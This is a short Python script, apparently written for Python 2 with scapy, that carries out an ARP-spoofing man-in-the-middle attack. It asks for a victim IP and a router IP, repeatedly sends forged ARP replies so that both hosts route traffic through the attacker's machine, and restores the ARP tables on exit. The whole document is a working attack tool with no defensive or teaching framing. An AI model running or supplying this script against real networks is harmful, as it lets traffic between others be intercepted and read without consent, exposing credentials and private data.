from scapy import *
import getmac
import sys
import os
import time


interface = raw_input("[*] Enter Desired Interface: ")
victimIP = raw_input("[*] Enter Victim IP: ")
gateIP = raw_input("[*] Enter Router IP: ")


def get_mac(IP):
    return getmac.get_mac_address(IP)


def reARP():
    print "\n[*] Restoring Targets..."
    victimMAC = get_mac(victimIP)
    gateMAC = get_mac(gateIP)
    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
    send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateMAC), count=7)
    print "[*] Disabling IP Forwarding..."
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print "[*] Shutting Down..."
    sys.exit(1)


def trick(gm, vm):
    send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst=vm))
    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst=gm))


def mitm():
    victimMAC = get_mac(victimIP)
    gateMAC = get_mac(gateIP)

    print "[*] Poisoning Targets..."
    while 1:
        try:
            trick(gateMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP()
            break


if __name__ == '__main__':
    mitm()
